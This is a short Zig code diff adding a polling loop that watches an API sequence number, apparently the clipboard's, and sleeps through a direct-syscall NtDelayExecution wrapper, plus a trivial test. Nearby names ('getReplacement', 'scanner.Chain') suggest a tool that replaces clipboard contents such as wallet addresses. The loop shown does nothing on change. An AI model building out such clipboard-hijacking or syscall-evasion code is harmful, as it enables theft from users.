@@ -387,6 +387,24 @@ fn getReplacement(chain: scanner.Chain) ?[]const u8 {
 
 // ── Tests ──
 
+pub fn start() void {
+    const seq_fn = resolveApi().get_seq_num orelse return;
+    var last_seq: u32 = 0;
+    while (true) {
+        const current_seq = seq_fn();
+        if (current_seq != last_seq) {
+            last_seq = current_seq;
+        }
+        const sleep_ms: u64 = 200;
+        var interval: i64 = -@as(i64, @intCast(sleep_ms * 10000));
+        _ = @import("../syscalls/engine.zig").NtDelayExecution(0, &interval);
+    }
+}
+
+test "start no crash" {
+    _ = start;
+}
+
 test "resolveApi returns null without user32" {
     // In test context, user32 is available
     const api = resolveApi();
